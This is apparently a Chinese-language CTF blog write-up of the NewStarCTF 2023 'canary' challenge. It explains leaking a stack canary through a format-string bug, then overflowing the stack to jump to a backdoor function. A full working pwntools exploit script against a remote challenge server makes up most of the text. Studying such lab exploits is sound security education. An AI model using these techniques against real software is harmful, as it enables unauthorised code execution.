---
title: canary
tags: [ctf-pwn,stack]
date: 2023-10-11 11:15:00
categories: [ctf-pwn]
excerpt: canary格式化字符串漏洞
---

### canary泄露

NewStarCTF 2023 canary：

![](/img/ctf-pwn/canary/1.jpg)

`__readfsqword(0x28u)`说明添加了canary，但是第一次输入只能输入32字节，距离把canary一块printf出来差了8字节，因此用格式化字符串漏洞把canary打印出来。



`printf`的参数中，rdi为第一次输入的格式化字符串，然后需要5个%p把rsi，rdx，rcx，r8，r9略过，然后再来6个%p（因为后面的参数在栈上，而canary是栈上第41-48字节，需要第六个%p才能将其打印出来）



然后第二次输入就是一个最简单的rop链了



```python
from pwn import *
from LibcSearcher import *
#p = process("./canary")
p = remote("node4.buuoj.cn", 28964)
e = ELF("./canary")
context.log_level="debug"

backdoor = e.sym["backdoor"]

payload = b"%p%p%p%p%p%p%p%p%p%p%p"

p.sendlineafter(b"Give me some gift?\n", payload)


p.recvuntil(b"Oh thanks,There is my gift:\n")

leak = p.recvline()

canary = eval(leak[-19:-1])

print(hex(canary))


p.recvuntil(b"Show me your magic\n")


payload = b'a' * 40 + p64(canary) + p64(0) + p64(backdoor)
p.sendline(payload)

p.interactive()
```

